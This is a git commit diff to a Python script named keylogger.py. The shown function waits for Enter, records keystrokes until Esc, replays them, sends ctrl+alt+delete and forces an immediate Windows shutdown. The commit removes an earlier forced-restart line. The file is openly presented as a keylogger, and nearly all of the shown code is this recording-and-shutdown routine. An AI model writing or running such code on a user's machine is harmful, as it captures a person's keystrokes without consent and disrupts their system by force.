5a489545f8d0a15891b01a8d71813776b41b9958
Adrino Rosario <rosarioadrino@gmail.com>
2022-05-15 16:35:44 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -6,7 +6,6 @@ import keyboard
 def keylogger():
     keyboard.wait('enter')
     recording = keyboard.record(until='esc')
-    os.system('shutdown /r /t 1')
     keyboard.play(recording, speed_factor=1.0)
     keyboard.press_and_release('ctrl+alt+delete, shift')
     os.system('shutdown /s /t 1')
